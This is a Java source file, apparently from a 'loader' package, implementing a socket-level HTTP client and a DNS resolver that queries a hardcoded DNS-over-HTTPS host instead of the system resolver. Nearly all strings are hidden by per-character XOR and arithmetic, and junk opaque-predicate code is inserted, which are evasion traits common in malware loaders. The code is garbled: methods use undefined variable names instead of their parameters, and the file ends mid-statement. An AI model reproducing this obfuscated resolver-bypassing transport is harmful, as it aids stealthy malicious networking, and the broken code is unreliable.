package net.efn.loader;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;
import javax.net.ssl.SNIHostName;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLParameters;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class HttpTransport {
   private static final Map<String, HttpTransport.CacheEntry> bkdfL = new ConcurrentHashMap<>();
   private static SSLSocketFactory aaVnhcimIdhf;

   public static HttpTransport.Response get(String urlStr) throws IOException {
      return kviXgqueVgguFpawvsc("GET", capSum, null, null, null);
   }

   public static HttpTransport.Response get(String urlStr, Map<String, String> headers) throws IOException {
      return kviXgqueVgguFpawvsc("GET", my_ejc_uxj, null, null, ExS);
   }

   public static HttpTransport.Response daiavydyStore(String urlStr, String body, String contentType) throws IOException {
      StringBuilder var3 = new StringBuilder();
      var3.append((char)(17102 ^ 17054));
      var3.append((char)(14204 ^ 14131));
      var3.append((char)(14672 ^ 14595));
      var3.append((char)('\ubde7' ^ '\ubdb3'));
      return kviXgqueVgguFpawvsc(var3.toString(), HrGr_GZaN_KAOb_ZlBp, CECz_FYBI_Eard_rnOS, ldcC_nZHX_lXmi_dkqh, null);
   }

   public static HttpTransport.Response bFguUEehmav(String urlStr, String body, String contentType, Map<String, String> headers) throws IOException {
      StringBuilder var4 = new StringBuilder();
      var4.append((char)(2945 - 2865));
      var4.append((char)(31969 - 31890));
      var4.append((char)(1514 - 1431));
      var4.append((char)(23513 - 23429));
      return kviXgqueVgguFpawvsc(var4.toString(), ghfajg_jteynt_ytpigy, vVal, dQkY02NtE_TpB, afzta_lvbb_zkgowj_zarycm);
   }

   public static HttpTransport.Response put(String urlStr, String body, String contentType, Map<String, String> headers) throws IOException {
      return kviXgqueVgguFpawvsc("PUT", tqnuB, ACyV, sGnk_lDWg_CzOw_ePcU, refBuf);
   }

   public static HttpTransport.Response kviXgqueVgguFpawvsc(String method, String urlStr, String body, String contentType, Map<String, String> customHeaders) throws IOException {
      URL nodebuf = URI.create(r0me4iK9ZrM_K).toURL();
      String kivoxnLfuDoOkmlby = nodebuf.getHost();
      int rgj_dqcc = nodebuf.getPort();
      String var10000 = nodebuf.getProtocol();
      char[] var22 = new char[]{
         (char)(9658 - 9554), (char)('\uacf0' - '\uac7c'), (char)('\ua79e' - '\ua72a'), (char)(6917 - 6805), (char)('\ua9d3' - '\ua960')
      };
      boolean il_nx_wwhpu_cbzq = var10000.equalsIgnoreCase(new String(var22));
      if (rgj_dqcc == -1) {
         rgj_dqcc = il_nx_wwhpu_cbzq ? 443 : 80;
      }

      String NhUk_UlPc_yIWa_zyWW = nodebuf.getPath();
      if (NhUk_UlPc_yIWa_zyWW == null || NhUk_UlPc_yIWa_zyWW.isEmpty()) {
         NhUk_UlPc_yIWa_zyWW = "/";
      }

      if (nodebuf.getQuery() != null) {
         String var25 = nodebuf.getQuery();
         NhUk_UlPc_yIWa_zyWW = NhUk_UlPc_yIWa_zyWW + "?" + var25;
      }

      String UdFP_DklO_erui_zXcm = ZYHh_wp(kivoxnLfuDoOkmlby);
      Socket ref4 = new Socket();
      ref4.setReceiveBufferSize(524288);
      ref4.connect(new InetSocketAddress(UdFP_DklO_erui_zXcm, rgj_dqcc), 10000);
      ref4.setSoTimeout(30000);
      Socket elemIn;
      if (il_nx_wwhpu_cbzq) {
         SSLSocket geyisWjuliiZzsHq = (SSLSocket)aaVnhcimIdhf.createSocket(ref4, kivoxnLfuDoOkmlby, rgj_dqcc, true);
         SSLParameters fUBNv1fIqMs0dK = geyisWjuliiZzsHq.getSSLParameters();
         fUBNv1fIqMs0dK.setServerNames(List.of(new SNIHostName(kivoxnLfuDoOkmlby)));
         StringBuilder var26 = new StringBuilder();
         var26.append((char)('\ua51f' + 23337));
         var26.append((char)('\ubdb6' + 17054));
         var26.append((char)(26905 + '\u973b'));
         var26.append((char)('\uea13' + 5693));
         var26.append((char)(28067 + '\u92b0'));
         fUBNv1fIqMs0dK.setEndpointIdentificationAlgorithm(var26.toString());
         geyisWjuliiZzsHq.setSSLParameters(fUBNv1fIqMs0dK);
         geyisWjuliiZzsHq.startHandshake();
         elemIn = geyisWjuliiZzsHq;
      } else {
         elemIn = ref4;
      }

      HttpTransport.Response var69;
      try {
         OutputStream bcgkHx = elemIn.getOutputStream();
         InputStream tIVL_n = elemIn.getInputStream();
         StringBuilder GYsioeyJrL_W6 = new StringBuilder();
         StringBuilder var70 = GYsioeyJrL_W6.append(argPos).append(" ").append(NhUk_UlPc_yIWa_zyWW);
         StringBuilder var28 = new StringBuilder();
         var28.append((char)('\u8114' + 32524));
         var28.append((char)('\u8089' + 32703));
         var28.append((char)(29134 + '\u8e86'));
         var28.append((char)(25266 + '\u9da2'));
         var28.append((char)(8025 + '\ue0f7'));
         var28.append((char)(25140 + '\u9dfb'));
         var28.append((char)(30320 + '\u89c1'));
         var28.append((char)(12000 + '\ud14e'));
         var28.append((char)(5624 + '\uea39'));
         var28.append((char)('\u8101' + 32524));
         var28.append((char)('\u804b' + 32703));
         var70.append(var28.toString());
         char[] var30 = new char[]{
            (char)(6446 ^ 6502), (char)(14702 ^ 14593), (char)(8769 ^ 8754), (char)('\ub07c' ^ '\ub008'), (char)(32023 ^ 32045), (char)('\uaf20' ^ '\uaf00')
         };
         GYsioeyJrL_W6.append(new String(var30)).append(kivoxnLfuDoOkmlby);
         if (il_nx_wwhpu_cbzq && rgj_dqcc != 443 || !il_nx_wwhpu_cbzq && rgj_dqcc != 80) {
            GYsioeyJrL_W6.append(":").append(rgj_dqcc);
         }

         GYsioeyJrL_W6.append("\r\n");
         StringBuilder var32 = new StringBuilder();
         var32.append((char)(16510 - 16443));
         var32.append((char)(65 - '\uffd2'));
         var32.append((char)(6882 - 6772));
         var32.append((char)(12868 - 12758));
         var32.append((char)('\ue524' - '\ue4bf'));
         var32.append((char)(31547 - 31448));
         var32.append((char)('\u8cb0' - '\u8c3c'));
         var32.append((char)(5230 - 5125));
         var32.append((char)('\ua482' - '\ua413'));
         var32.append((char)(24238 - 24128));
         var32.append((char)('\ub73b' - '\ub701'));
         var32.append((char)(16475 - 16443));
         var32.append((char)(53 - '\uffd2'));
         var32.append((char)(6880 - 6772));
         var32.append((char)(12869 - 12758));
         var32.append((char)('\ue532' - '\ue4bf'));
         var32.append((char)(31549 - 31448));
         var32.append((char)('\u8c49' - '\u8c3c'));
         var32.append((char)(5135 - 5125));
         GYsioeyJrL_W6.append(var32.toString());
         boolean limitOut = false;
         boolean cursorMin = false;
         if (zIPX__7f != null) {
            for (Entry JgqOZs : zIPX__7f.entrySet()) {
               String ref3 = (String)JgqOZs.getKey();
               char[] var34 = new char[]{(char)('\ua649' ^ '\ua601'), (char)(32476 ^ 32435), (char)(22436 ^ 22487), (char)(3081 ^ 3197)};
               if (!ref3.equalsIgnoreCase(new String(var34))) {
                  char[] var36 = new char[]{
                     (char)('\ue265' + 7646),
                     (char)('\ud89d' + 10194),
                     (char)(30150 + '\u8aa8'),
                     (char)(8285 + '\ue011'),
                     (char)(24991 + '\u9ec6'),
                     (char)(15809 + '\uc2a2'),
                     (char)('\uf465' + 3087),
                     (char)('\ua817' + 22610),
                     (char)(7500 + '\ue323'),
                     (char)('\ufb02' + 1388)
                  };
                  if (!ref3.equalsIgnoreCase(new String(var36))) {
                     StringBuilder var38 = new StringBuilder();
                     var38.append((char)(4361 ^ 4426));
                     var38.append((char)('\ueae3' ^ '\uea8c'));
                     var38.append((char)('\u9d88' ^ '\u9de6'));
                     var38.append((char)(12446 ^ 12522));
                     var38.append((char)('\uf237' ^ '\uf252'));
                     var38.append((char)(1168 ^ 1278));
                     var38.append((char)('\uce18' ^ '\uce6c'));
                     var38.append((char)(4455 ^ 4426));
                     var38.append((char)('\ueac0' ^ '\uea8c'));
                     var38.append((char)('\u9d83' ^ '\u9de6'));
                     var38.append((char)(12420 ^ 12522));
                     var38.append((char)('\uf235' ^ '\uf252'));
                     var38.append((char)(1162 ^ 1278));
                     var38.append((char)('\uce04' ^ '\uce6c'));
                     if (!ref3.equalsIgnoreCase(var38.toString())) {
                        char[] var40 = new char[]{
                           (char)(14332 ^ 14269),
                           (char)(6923 ^ 7016),
                           (char)('\u8675' ^ '\u8616'),
                           (char)('\u9bf6' ^ '\u9b93'),
                           (char)('\uf1c7' ^ '\uf1b7'),
                           (char)(813 ^ 857)
                        };
                        if (ref3.equalsIgnoreCase(new String(var40))) {
                           limitOut = true;
                        }

                        char[] var42 = new char[]{
                           (char)('\u9447' - '\u93f2'),
                           (char)('\uc362' - '\uc2ef'),
                           (char)('\ud12d' - '\ud0c8'),
                           (char)('\ub705' - '\ub693'),
                           (char)(11783 - 11738),
                           (char)('\u8637' - '\u85f6'),
                           (char)(30284 - 30181),
                           (char)(13459 - 13358),
                           (char)(18160 - 18050),
                           (char)('\u9873' - '\u97ff')
                        };
                        if (ref3.equalsIgnoreCase(new String(var42))) {
                           cursorMin = true;
                        }

                        GYsioeyJrL_W6.append(ref3).append(": ").append((String)JgqOZs.getValue()).append("\r\n");
                     }
                  }
               }
            }
         }

         if (!limitOut) {
            char[] var44 = new char[]{
               (char)('\u8e42' ^ '\u8e03'),
               (char)('\u8051' ^ '\u8032'),
               (char)(25848 ^ 25755),
               (char)('\ua4ed' ^ '\ua488'),
               (char)('\u8e73' ^ '\u8e03'),
               (char)('\u8046' ^ '\u8032'),
               (char)(25761 ^ 25755),
               (char)('\ua4a8' ^ '\ua488'),
               (char)('\u8e29' ^ '\u8e03'),
               (char)('\u801d' ^ '\u8032'),
               (char)(25777 ^ 25755),
               (char)('\ua485' ^ '\ua488'),
               (char)('\u8e09' ^ '\u8e03')
            };
            GYsioeyJrL_W6.append(new String(var44));
         }

         if (!cursorMin) {
            StringBuilder var46 = new StringBuilder();
            StringBuilder var47 = new StringBuilder();
            var47.append((char)('\u8f67' ^ '\u8f32'));
            var47.append((char)(13302 ^ 13189));
            var47.append((char)(11140 ^ 11233));
            var47.append((char)(6798 ^ 6908));
            var47.append((char)('\ub53e' ^ '\ub513'));
            var47.append((char)(15306 ^ 15243));
            var47.append((char)('\ud4f8' ^ '\ud49f'));
            var47.append((char)(23048 ^ 23149));
            var47.append((char)(22806 ^ 22904));
            var47.append((char)('\ue97d' ^ '\ue909'));
            var47.append((char)(772 ^ 830));
            var46.append(var47.toString());
            StringBuilder var49 = new StringBuilder();
            var49.append((char)('\uf329' ^ '\uf309'));
            var49.append((char)('\ua5fe' ^ '\ua5b3'));
            var49.append((char)('\uedc3' ^ '\uedac'));
            var49.append((char)(27994 ^ 27936));
            var49.append((char)(7757 ^ 7716));
            var49.append((char)(18814 ^ 18706));
            var49.append((char)(9928 ^ 9892));
            var49.append((char)('\uc6a2' ^ '\uc6c3'));
            var46.append(var49.toString());
            char[] var51 = new char[]{
               (char)('\ud27d' - '\ud24e'),
               (char)('\ud245' - '\ud210'),
               (char)(27759 - 27713),
               (char)(17366 - 17318),
               (char)('\uc751' - '\uc731'),
               (char)('\u96f8' - '\u96d0'),
               (char)('\uce57' - '\uce00'),
               (char)(6301 - 6196),
               (char)('\udb1f' - '\udab1'),
               (char)('\ue5bf' - '\ue55b'),
               (char)('\ued92' - '\ued23'),
               (char)(18735 - 18616),
               (char)('\uaa64' - '\ua9f1')
            };
            var46.append(new String(var51));
            StringBuilder var53 = new StringBuilder();
            var53.append((char)(15817 ^ 15849));
            var53.append((char)('\uc7a6' ^ '\uc7e8'));
            var53.append((char)('\uacb3' ^ '\uace7'));
            var53.append((char)('\ufc14' ^ '\ufc34'));
            var53.append((char)('\uef83' ^ '\uefb2'));
            var53.append((char)(21773 ^ 21821));
            var53.append((char)(15815 ^ 15849));
            var53.append((char)('\uc7d8' ^ '\uc7e8'));
            var46.append(var53.toString());
            char[] var55 = new char[]{
               (char)('\ue242' + 7673),
               (char)(5595 + '\uea45'),
               (char)(28422 + '\u9151'),
               (char)(15679 + '\uc32a'),
               (char)(18652 + '\ub792'),
               (char)(26246 + '\u99b0'),
               (char)('\uce29' + 12811),
               (char)('\ub5c8' + 19059),
               (char)('\u9d44' + 25308),
               (char)('\ue27f' + 7673),
               (char)(5617 + '\uea45')
            };
            var46.append(new String(var55));
            char[] var57 = new char[]{
               (char)(24712 ^ 24764),
               (char)('\ub624' ^ '\ub60d'),
               (char)('\uc75e' ^ '\uc77e'),
               (char)('\uea0e' ^ '\uea4f'),
               (char)('\ud906' ^ '\ud976'),
               (char)(24780 ^ 24764),
               (char)('\ub661' ^ '\ub60d'),
               (char)('\uc71b' ^ '\uc77e'),
               (char)('\uea18' ^ '\uea4f')
            };
            var46.append(new String(var57));
            char[] var59 = new char[]{
               (char)('\uaf8f' + 20694),
               (char)('\ude3c' + 8742),
               (char)(22795 + '\ua740'),
               (char)('\ub852' + 18455),
               (char)(752 + '\ufd84'),
               (char)('\uaf59' + 20694),
               (char)('\ude0f' + 8742),
               (char)(22771 + '\ua740'),
               (char)('\ub820' + 18455),
               (char)(682 + '\ufd84'),
               (char)('\uaf5d' + 20694),
               (char)('\ude10' + 8742),
               (char)(22733 + '\ua740'),
               (char)('\ub7f3' + 18455)
            };
            var46.append(new String(var59));
            GYsioeyJrL_W6.append(var46.toString());
         }

         byte[] uOcT = null;
         if (_W6yoD != null) {
            uOcT = _W6yoD.getBytes(StandardCharsets.UTF_8);
            if (posSum != null) {
               char[] var61 = new char[]{
                  (char)('\u8545' + 31486),
                  (char)(7634 + '\ue29d'),
                  (char)(3352 + '\uf356'),
                  (char)('\uf3c7' + 3245),
                  (char)(6026 + '\ue8db'),
                  (char)(7176 + '\ue466'),
                  (char)(18266 + '\ub91a'),
                  (char)('\ud2a3' + 11658),
                  (char)('\u8b3c' + 29976),
                  (char)('\ud577' + 11010),
                  (char)('\uc098' + 16344),
                  (char)('\u8567' + 31486),
                  (char)(7581 + '\ue29d'),
                  (char)(3274 + '\uf356')
               };
               GYsioeyJrL_W6.append(new String(var61)).append(posSum).append("\r\n");
            }

            StringBuilder var63 = new StringBuilder();
            var63.append((char)(31410 ^ 31473));
            var63.append((char)(22956 ^ 22979));
            var63.append((char)('\ub03e' ^ '\ub050'));
            var63.append((char)(14481 ^ 14565));
            var63.append((char)('\ucdc7' ^ '\ucda2'));
            var63.append((char)(31391 ^ 31473));
            var63.append((char)(22967 ^ 22979));
            var63.append((char)('\ub07d' ^ '\ub050'));
            var63.append((char)(14505 ^ 14565));
            var63.append((char)('\ucdc7' ^ '\ucda2'));
            var63.append((char)(31391 ^ 31473));
            var63.append((char)(22948 ^ 22979));
            var63.append((char)('\ub024' ^ '\ub050'));
            var63.append((char)(14477 ^ 14565));
            var63.append((char)('\ucd98' ^ '\ucda2'));
            var63.append((char)(31441 ^ 31473));
            GYsioeyJrL_W6.append(var63.toString()).append(uOcT.length).append("\r\n");
         }

         GYsioeyJrL_W6.append("\r\n");
         bcgkHx.write(GYsioeyJrL_W6.toString().getBytes(StandardCharsets.ISO_8859_1));
         if (uOcT != null) {
            bcgkHx.write(uOcT);
         }

         bcgkHx.flush();
         var69 = copyUzzcstd(tIVL_n);
      } finally {
         elemIn.close();
      }

      return var69;
   }

   private static HttpTransport.Response copyUzzcstd(InputStream in) throws IOException {
      BufferedInputStream c0 = new BufferedInputStream(bjCtswOfcwfr);
      ByteArrayOutputStream n5 = new ByteArrayOutputStream();
      int JnHU0vmczfLF67 = -1;

      int awblo_qz_ddusnd;
      while ((awblo_qz_ddusnd = c0.read()) != -1) {
         n5.write(awblo_qz_ddusnd);
         if (JnHU0vmczfLF67 == 13 && awblo_qz_ddusnd == 10) {
            int vx7hxv = n5.size();
            byte[] bufPos = n5.toByteArray();
            if (vx7hxv >= 4 && bufPos[vx7hxv - 4] == 13 && bufPos[vx7hxv - 3] == 10) {
               break;
            }
         }

         JnHU0vmczfLF67 = awblo_qz_ddusnd;
      }

      String AlhGO5 = n5.toString(StandardCharsets.ISO_8859_1);
      String[] vnngooAggqac = AlhGO5.split("\r\n");
      String aidx = vnngooAggqac.length > 0 ? vnngooAggqac[0] : "";
      int qyGlrtcOpytFzmrar = 0;
      StringBuilder var18 = new StringBuilder();
      var18.append((char)('\ua731' - '\ua6e9'));
      var18.append((char)(31247 - 31163));
      var18.append((char)(13560 - 13476));
      var18.append((char)(26691 - 26611));
      var18.append((char)(14308 - 14261));
      if (aidx.startsWith(var18.toString())) {
         int QVWi3DY_TFE = aidx.indexOf(32);
         if (QVWi3DY_TFE > 0) {
            int nvuMzflmsMoa = aidx.indexOf(32, QVWi3DY_TFE + 1);
            String paramPos = nvuMzflmsMoa > 0 ? aidx.substring(QVWi3DY_TFE + 1, nvuMzflmsMoa) : aidx.substring(QVWi3DY_TFE + 1);

            try {
               qyGlrtcOpytFzmrar = Integer.parseInt(paramPos.trim());
            } catch (NumberFormatException var26) {
            }
         }
      }

      Map DmL_8ek_foCn = new LinkedHashMap();
      int entry5 = -1;
      boolean flagsCnt = false;

      for (int ytPqyqhMdh = 1; ytPqyqhMdh < vnngooAggqac.length; ytPqyqhMdh++) {
         String strSum = vnngooAggqac[ytPqyqhMdh];
         int xydyktFpalplXdef = strSum.indexOf(58);
         if (xydyktFpalplXdef > 0) {
            String rgrfWh_Tw06xU = strSum.substring(0, xydyktFpalplXdef).trim().toLowerCase();
            String YDCF_wCic_uZQh_mQGY = strSum.substring(xydyktFpalplXdef + 1).trim();
            DmL_8ek_foCn.put(rgrfWh_Tw06xU, YDCF_wCic_uZQh_mQGY);
            StringBuilder var20 = new StringBuilder();
            var20.append((char)('\u9721' + 26946));
            var20.append((char)('\u87da' + 30869));
            var20.append((char)(21176 + '\uadb6'));
            var20.append((char)('\uc848' + 14380));
            var20.append((char)(17661 + '\ubb68'));
            var20.append((char)(29973 + '\u8b59'));
            var20.append((char)('\u87fb' + 30841));
            var20.append((char)(2881 + '\uf4ec'));
            var20.append((char)(23966 + '\ua2ce'));
            var20.append((char)('\ue17f' + 7910));
            var20.append((char)('\ubaf7' + 17783));
            var20.append((char)('\ub5e4' + 19075));
            var20.append((char)('\u9732' + 26946));
            var20.append((char)('\u87d3' + 30869));
            if (rgrfWh_Tw06xU.equals(var20.toString())) {
               try {
                  entry5 = Integer.parseInt(YDCF_wCic_uZQh_mQGY);
               } catch (NumberFormatException var25) {
               }
            } else {
               StringBuilder var22 = new StringBuilder();
               var22.append((char)(26938 - 26822));
               var22.append((char)('\u91eb' - '\u9179'));
               var22.append((char)('\udb22' - '\udac1'));
               var22.append((char)('\u91de' - '\u9170'));
               var22.append((char)(26937 - 26822));
               var22.append((char)('\u91df' - '\u9179'));
               var22.append((char)('\udb26' - '\udac1'));
               var22.append((char)('\u91e2' - '\u9170'));
               var22.append((char)(26867 - 26822));
               var22.append((char)('\u91de' - '\u9179'));
               var22.append((char)('\udb2f' - '\udac1'));
               var22.append((char)('\u91d3' - '\u9170'));
               var22.append((char)(26933 - 26822));
               var22.append((char)('\u91dd' - '\u9179'));
               var22.append((char)('\udb2a' - '\udac1'));
               var22.append((char)('\u91de' - '\u9170'));
               var22.append((char)(26925 - 26822));
               if (rgrfWh_Tw06xU.equals(var22.toString())) {
                  String var10000 = YDCF_wCic_uZQh_mQGY.toLowerCase();
                  char[] var24 = new char[]{
                     (char)(2088 - 1989),
                     (char)('\u896f' - '\u8907'),
                     (char)('\ud211' - '\ud19c'),
                     (char)('\uee15' - '\ueda7'),
                     (char)('\u9b84' - '\u9b19'),
                     (char)('\ua916' - '\ua8b1'),
                     (char)(16359 - 16259)
                  };
                  if (var10000.contains(new String(var24))) {
                     flagsCnt = true;
                  }
               }
            }
         }
      }

      byte[] blqjo_esu_knbzno;
      if (flagsCnt) {
         blqjo_esu_knbzno = bphhYgdqvapClplmKnawnpe(c0);
      } else if (entry5 >= 0) {
         blqjo_esu_knbzno = new byte[entry5];
         int uafP_mPgQ_OSXS_aLRn = 0;

         while (uafP_mPgQ_OSXS_aLRn < entry5) {
            int VIa6Pm = c0.read(blqjo_esu_knbzno, uafP_mPgQ_OSXS_aLRn, entry5 - uafP_mPgQ_OSXS_aLRn);
            if (VIa6Pm == -1) {
               break;
            }

            uafP_mPgQ_OSXS_aLRn += VIa6Pm;
         }
      } else {
         ByteArrayOutputStream ptrCnt = new ByteArrayOutputStream(1048576);
         byte[] koh_pz_ni_vfn = new byte[131072];

         int mMax;
         while ((mMax = c0.read(koh_pz_ni_vfn)) != -1) {
            ptrCnt.write(koh_pz_ni_vfn, 0, mMax);
         }

         blqjo_esu_knbzno = ptrCnt.toByteArray();
      }

      return new HttpTransport.Response(qyGlrtcOpytFzmrar, aidx, DmL_8ek_foCn, blqjo_esu_knbzno);
   }

   private static byte[] bphhYgdqvapClplmKnawnpe(InputStream in) throws IOException {
      ByteArrayOutputStream avd_sjue_oef_cd = new ByteArrayOutputStream(1048576);
      StringBuilder uHaF_nsmG_ZqzS_UgNC = new StringBuilder();

      while (true) {
         uHaF_nsmG_ZqzS_UgNC.setLength(0);

         int prevData;
         while ((prevData = bIdx.read()) != -1 && prevData != 13) {
            uHaF_nsmG_ZqzS_UgNC.append((char)prevData);
         }

         if (prevData == 13) {
            bIdx.read();
         }

         String bVal = uHaF_nsmG_ZqzS_UgNC.toString();
         int jjqzjm_hbhds_pns = bVal.indexOf(59);
         if (jjqzjm_hbhds_pns >= 0) {
            bVal = bVal.substring(0, jjqzjm_hbhds_pns);
         }

         if (bVal.isEmpty()) {
            break;
         }

         int cesutvAnfsu = Integer.parseInt(bVal.trim(), 16);
         if (cesutvAnfsu == 0) {
            break;
         }

         byte[] val5 = new byte[cesutvAnfsu];
         int lenStr = 0;

         while (true) {
            if (lenStr < cesutvAnfsu) {
               int found1 = bIdx.read(val5, lenStr, cesutvAnfsu - lenStr);
               if (found1 != -1) {
                  lenStr += found1;
                  continue;
               }
            }

            avd_sjue_oef_cd.write(val5, 0, lenStr);
            bIdx.read();
            bIdx.read();
            break;
         }
      }

      return avd_sjue_oef_cd.toByteArray();
   }

   public static String ZYHh_wp(String hostname) throws IOException {
      if (nrwGcqJx(yWoFhgbxTeDr0p)) {
         return yWoFhgbxTeDr0p;
      } else {
         HttpTransport.CacheEntry wtHl_DSuE_XgOu_xoZD = bkdfL.get(yWoFhgbxTeDr0p);
         int var5 = 1923225513;
         if ((var5 & 1923225513) == 1923225513) {
            var5 = -475800770;
            var5 <<= 3;
            var5 >>>= 26;
            int var6 = 235345628;
            var6 += 121;
            var6 ^= -2001078766;
            var6 <<= 2;
         }

         if (wtHl_DSuE_XgOu_xoZD != null && !wtHl_DSuE_XgOu_xoZD.isExpired()) {
            return wtHl_DSuE_XgOu_xoZD.ip;
         } else {
            byte[] ebmheJviSvsatTebd = dkgDY(yWoFhgbxTeDr0p);
            byte[] ULeh_GmlR_FFEQ_lKwu = jZCRZvW7(ebmheJviSvsatTebd);
            String BkWSmBEaCKabOk = fqqnxm(ULeh_GmlR_FFEQ_lKwu);
            if (BkWSmBEaCKabOk != null) {
               bkdfL.put(yWoFhgbxTeDr0p, new HttpTransport.CacheEntry(BkWSmBEaCKabOk, System.currentTimeMillis() + 300000L));
            }

            return BkWSmBEaCKabOk;
         }
      }
   }

   private static boolean nrwGcqJx(String s) {
      if (GUwp_mmCA_AyhC_Gkxl != null && !GUwp_mmCA_AyhC_Gkxl.isEmpty()) {
         for (int varLen = 0; varLen < GUwp_mmCA_AyhC_Gkxl.length(); varLen++) {
            char cOut = GUwp_mmCA_AyhC_Gkxl.charAt(varLen);
            if (cOut != '.' && (cOut < '0' || cOut > '9')) {
               return false;
            }
         }

         return GUwp_mmCA_AyhC_Gkxl.contains(".");
      } else {
         return false;
      }
   }

   private static byte[] dkgDY(String hostname) {
      ByteArrayOutputStream QaeW = new ByteArrayOutputStream();
      DataOutputStream holderlen = new DataOutputStream(QaeW);

      try {
         short mAcc = (short)(System.nanoTime() & 65535L);
         holderlen.writeShort(mAcc);
         holderlen.writeShort(256);
         holderlen.writeShort(1);
         holderlen.writeShort(0);
         holderlen.writeShort(0);
         holderlen.writeShort(0);
         String[] var4 = val1.split("\\.");
         int var5 = var4.length;
         int var6 = 0;

         while (true) {
            int var8 = 766765519;
            if ((var8 ^ 766765519) == 0) {
               var8 = 1013898868;
               var8 <<= 24;
               var8 >>>= 29;
               int var9 = -637426552;
               var9 ^= -1932879729;
            }

            if (var6 >= var5) {
               holderlen.writeByte(0);
               holderlen.writeShort(1);
               holderlen.writeShort(1);
               return QaeW.toByteArray();
            }

            String v4 = var4[var6];
            holderlen.writeByte(v4.length());
            holderlen.writeBytes(v4);
            var6++;
         }
      } catch (IOException var10) {
         throw new RuntimeException(var10);
      }
   }

   private static byte[] jZCRZvW7(byte[] dnsQuery) throws IOException {
      Socket punq_qwpqkh_uil_kuwhbg = new Socket();
      char[] var11 = new char[]{
         (char)(18948 ^ 18997),
         (char)(23870 ^ 23824),
         (char)(6583 ^ 6534),
         (char)('\ue10b' ^ '\ue125'),
         (char)('\ucea5' ^ '\uce94'),
         (char)(28384 ^ 28366),
         (char)(18948 ^ 18997)
      };
      punq_qwpqkh_uil_kuwhbg.connect(new InetSocketAddress(new String(var11), 443), 10000);
      punq_qwpqkh_uil_kuwhbg.setSoTimeout(30000);
      char[] var13 = new char[]{
         (char)(11442 ^ 11473),
         (char)(19541 ^ 19513),
         (char)(1195 ^ 1220),
         (char)(16631 ^ 16514),
         (char)('\ued3a' ^ '\ued5e'),
         (char)('\ub8a9' ^ '\ub8cf'),
         (char)(21234 ^ 21150),
         (char)(10716 ^ 10685),
         (char)(21326 ^ 21308),
         (char)(3426 ^ 3335),
         (char)(5630 ^ 5587),
         (char)('\u81eb' ^ '\u818f'),
         (char)(11455 ^ 11473),
         (char)(19530 ^ 19513),
         (char)(1258 ^ 1220),
         (char)(16609 ^ 16514),
         (char)('\ued31' ^ '\ued5e'),
         (char)('\ub8a2' ^ '\ub8cf')
      };
      SSLSocket pddvik_sk_wnaw_hxgmyo = (SSLSocket)aaVnhcimIdhf.createSocket(punq_qwpqkh_uil_kuwhbg, new String(var13), 443, true);
      SSLParameters jjkjOqb = pddvik_sk_wnaw_hxgmyo.getSSLParameters();
      char[] var15 = new char[]{
         (char)('\uff8a' ^ '\uffe9'),
         (char)('\ubd41' ^ '\ubd2d'),
         (char)(19127 ^ 19160),
         (char)('\udc67' ^ '\udc12'),
         (char)(29870 ^ 29898),
         (char)('\ued62' ^ '\ued04'),
         (char)('\u8ccc' ^ '\u8ca0'),
         (char)('\uebf8' ^ '\ueb99'),
         (char)('\ubce9' ^ '\ubc9b'),
         (char)('\uf008' ^ '\uf06d'),
         (char)('\ue14f' ^ '\ue162'),
         (char)(3490 ^ 3526),
         (char)('\uff87' ^ '\uffe9'),
         (char)('\ubd5e' ^ '\ubd2d'),
         (char)(19190 ^ 19160),
         (char)('\udc71' ^ '\udc12'),
         (char)(29861 ^ 29898),
         (char)('\ued69' ^ '\ued04')
      };
      jjkjOqb.setServerNames(List.of(new SNIHostName(new String(var15))));
      pddvik_sk_wnaw_hxgmyo.setSSLParameters(jjkjOqb);
      pddvik_sk_wnaw_hxgmyo.startHandshake();

      byte[] var9;
      try {
         OutputStream oJy6hjTT = pddvik_sk_wnaw_hxgmyo.getOutputStream();
         InputStream r2zXx = pddvik_sk_wnaw_hxgmyo.getInputStream();
         String head2 = Base64.getUrlEncoder().withoutPadding().encodeToString(tfa_bcblg);
         StringBuilder itemRaw = new StringBuilder();
         char[] var17 = new char[]{
            (char)('\u8bfb' + 29772),
            (char)(787 + '\ufd32'),
            (char)('\udc26' + 9262),
            (char)(13606 + '\ucafa'),
            (char)(22297 + '\ua916'),
            (char)('\ubb06' + 17758),
            (char)(19753 + '\ub345'),
            (char)(9367 + '\udbdc'),
            (char)(31690 + '\u8463'),
            (char)(16544 + '\ubfd1'),
            (char)(6187 + '\ue84a'),
            (char)(21365 + '\uacf0'),
            (char)('\u8c26' + 29772),
            (char)(839 + '\ufd32'),
            (char)('\udc11' + 9262),
            (char)(13674 + '\ucafa'),
            (char)(22360 + '\ua916'),
            (char)('\ubb15' + 17758),
            (char)(19704 + '\ub345')
         };
         StringBuilder var10000 = itemRaw.append(new String(var17)).append(head2);
         char[] var19 = new char[]{
            (char)(6394 - 6362),
            (char)(17602 - 17530),
            (char)(8746 - 8662),
            (char)('\uaa10' - '\ua9bc'),
            (char)(16870 - 16790),
            (char)('\ube22' - '\ubdf3'),
            (char)(6411 - 6362),
            (char)(17576 - 17530),
            (char)(8711 - 8662),
            (char)('\ua9c9' - '\ua9bc'),
            (char)(16800 - 16790)
         };
         var10000.append(new String(var19));
         StringBuilder var21 = new StringBuilder();
         StringBuilder var22 = new StringBuilder();
         var22.append((char)('\uece6' ^ '\uecae'));
         var22.append((char)(3437 ^ 3330));
         var22.append((char)(1168 ^ 1251));
         var22.append((char)('\uec48' ^ '\uec3c'));
         var22.append((char)(4674 ^ 4728));
         var22.append((char)('\uab8f' ^ '\uabaf'));
         var22.append((char)('\ucedc' ^ '\ucebf'));
         var22.append((char)(30000 ^ 30044));
         var22.append((char)('\u9dec' ^ '\u9d83'));
         var22.append((char)('\u8645' ^ '\u8630'));
         var22.append((char)('\ue332' ^ '\ue356'));
         var22.append((char)(31519 ^ 31609));
         var22.append((char)('\u8017' ^ '\u807b'));
